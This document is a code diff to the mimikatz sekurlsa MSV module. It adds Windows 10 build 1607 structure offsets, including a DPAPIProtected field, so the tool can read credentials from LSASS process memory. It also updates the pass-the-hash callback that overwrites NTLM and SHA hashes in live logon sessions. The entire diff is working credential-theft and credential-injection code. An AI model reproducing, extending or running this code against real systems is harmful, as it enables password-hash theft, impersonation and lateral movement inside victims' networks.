@@ -50,6 +50,11 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKUHL_M_SEKURLSA_CON
 			*(PBOOLEAN) (msvCredentials + helper->offsetToisShaOwPassword) = FALSE;
 			if(helper->offsetToisIso)
 				*(PBOOLEAN) (msvCredentials + helper->offsetToisIso) = FALSE;
+			if(helper->offsetToisDPAPIProtected)
+			{
+				*(PBOOLEAN) (msvCredentials + helper->offsetToisDPAPIProtected) = FALSE;
+				RtlZeroMemory(msvCredentials + helper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH);
+			}
 			RtlZeroMemory(msvCredentials + helper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH);
 			RtlZeroMemory(msvCredentials + helper->offsetToShaOwPassword, SHA_DIGEST_LENGTH);
 			if(pthDataCred->pthData->NtlmHash)
@@ -105,9 +110,9 @@ VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID 
 				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)))
 				{
 					aLsassMemory.address = primaryCredentials.Credentials.Buffer;
-					if(kull_m_string_getUnicodeString(&primaryCredentials.Credentials, cLsass->hLsassMem))
+					if(kull_m_process_getUnicodeString(&primaryCredentials.Credentials, cLsass->hLsassMem))
 					{
-						if(kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, cLsass->hLsassMem))
+						if(kull_m_process_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, cLsass->hLsassMem))
 						{
 							credCallback(cLsass, &primaryCredentials, credentials.AuthenticationPackageId, &aLsassMemory, optionalData);
 							LocalFree(primaryCredentials.Primary.Buffer);
@@ -123,9 +128,10 @@ VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID 
 }
 
 const MSV1_0_PRIMARY_HELPER msv1_0_primaryHelper[] = {
-	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, UserName), 0, FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, ShaOwPassword), 0},
-	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, UserName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, ShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, align0)},
-	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, UserName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, ShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword)},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LogonDomainName),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, UserName),			0,														FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isNtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isLmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isShaOwPassword),			0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, NtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, ShaOwPassword),			0,																	0},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, ShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword)},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LogonDomainName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, UserName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isNtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isLmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, ShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword)},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isDPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, ShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, DPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword)},
 };
 
 const MSV1_0_PRIMARY_HELPER * kuhl_m_sekurlsa_msv_helper(PKUHL_M_SEKURLSA_CONTEXT context)
@@ -135,7 +141,9 @@ const MSV1_0_PRIMARY_HELPER * kuhl_m_sekurlsa_msv_helper(PKUHL_M_SEKURLSA_CONTEX
 		helper = &msv1_0_primaryHelper[0];
 	else if(context->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1511)
 		helper = &msv1_0_primaryHelper[1];
-	else
+	else if(context->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1607)
 		helper = &msv1_0_primaryHelper[2];
+	else
+		helper = &msv1_0_primaryHelper[3];
 	return helper;
 }
